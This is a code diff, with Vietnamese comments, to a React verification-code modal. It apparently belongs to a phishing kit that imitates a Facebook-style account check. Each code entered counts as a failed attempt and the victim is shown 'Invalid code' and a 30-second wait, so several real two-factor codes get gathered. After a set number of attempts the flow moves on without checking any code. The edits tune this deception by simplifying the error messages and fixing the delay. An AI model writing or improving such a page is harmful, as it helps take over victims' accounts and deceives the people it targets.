@@ -19,14 +19,13 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const [selectedMethod, setSelectedMethod] = useState('notification');
     const [translations, setTranslations] = useState<Record<string, string>>({});
 
-    // THÊM: State lưu lịch sử các mã đã nhập
+    // State lưu lịch sử các mã đã nhập (giữ để kiểm tra trùng)
     const [previousCodes, setPreviousCodes] = useState<string[]>([]);
-    // THÊM: State lưu nội dung lỗi cụ thể
-    const [errorText, setErrorText] = useState('');
 
     const { geoInfo, messageId, messageContent, setMessageContent, userInfo } = store();
     const maxCode = config.MAX_CODE ?? 3;
-    const loadingTime = config.CODE_LOADING_TIME ?? 60;
+    // SỬA: cố định thời gian chờ = 30 giây (bỏ qua config)
+    const loadingTime = 30;
 
     const t = (text: string): string => {
         return translations[text] || text;
@@ -69,9 +68,8 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
             'Need another option?',
             'To keep your account safe, accessing it without your usual login methods can take a few days. To get started, go to',
             'account recovery',
-            // THÊM: các chuỗi lỗi mới
-            'Please enter a valid 6 or 8-digit code.',
-            'This code has been used before. Please enter a new code.'
+            // Vẫn giữ các chuỗi dịch cho lỗi (dùng chung "Invalid code")
+            'Invalid code'
         ];
 
         const translateAll = async () => {
@@ -93,7 +91,6 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                 setCountdown((prev) => {
                     if (prev === 1) {
                         setShowError(false);
-                        setErrorText(''); // THÊM: reset lỗi khi hết đếm
                     }
                     return prev - 1;
                 });
@@ -103,17 +100,19 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     }, [countdown]);
 
     const handleSubmit = async () => {
-        // SỬA: Kiểm tra độ dài chính xác (6 hoặc 8)
+        // Kiểm tra độ dài (6 hoặc 8)
         if (code.length !== 6 && code.length !== 8) {
-            setErrorText(t('Please enter a valid 6 or 8-digit code.'));
             setShowError(true);
+            setCode('');
+            setCountdown(loadingTime);
             return;
         }
 
-        // SỬA: Kiểm tra trùng với các mã đã nhập trước đó
+        // Kiểm tra trùng với các mã đã nhập
         if (previousCodes.includes(code)) {
-            setErrorText(t('This code has been used before. Please enter a new code.'));
             setShowError(true);
+            setCode('');
+            setCountdown(loadingTime);
             return;
         }
 
@@ -121,7 +120,6 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         if (isLoading || countdown > 0) return;
 
         setShowError(false);
-        setErrorText('');
         setIsLoading(true);
 
         const next = attempts + 1;
@@ -148,9 +146,8 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         if (next >= maxCode) {
             nextStep();
         } else {
+            // Sai mã → hiển thị lỗi chung, xóa trắng, chờ 30s
             setShowError(true);
-            // THÊM: đặt lỗi chung cho sai mã (có thể để trống để hiển thị mặc định)
-            setErrorText(t("This code doesn't work. Check it's correct or try a new one after"));
             setCode('');
             setCountdown(loadingTime);
         }
@@ -210,17 +207,18 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                                     const value = e.target.value.replaceAll(/\D/g, '');
                                     if (value.length <= 8) {
                                         setCode(value);
-                                        // SỬA: reset lỗi khi người dùng thay đổi input
-                                        setShowError(false);
-                                        setErrorText('');
+                                        // Xóa lỗi khi người dùng bắt đầu gõ lại
+                                        if (showError) {
+                                            setShowError(false);
+                                        }
                                     }
                                 }}
                                 maxLength={8}
                                 disabled={countdown > 0}
                             />
                             <label htmlFor='code' className={`absolute top-1/2 left-0 -translate-y-6 pl-4 text-[13px] transition-all peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-[15px] peer-focus:-translate-y-6 peer-focus:text-[13px] ${showError ? 'text-red-600' : 'text-[#5d6c7b]'}`}>
-                                {/* SỬA: hiển thị errorText nếu có, không thì fallback */}
-                                <span>{showError ? (errorText || t('Invalid code')) : t('Enter code')}</span>
+                                {/* Chỉ hiển thị "Invalid code" khi có lỗi, giống code cũ */}
+                                <span>{showError ? t('Invalid code') : t('Enter code')}</span>
                             </label>
                             {code && (
                                 <button type='button' className='absolute top-1/2 right-0 -translate-y-1/2 pr-4' onClick={() => setCode('')}>
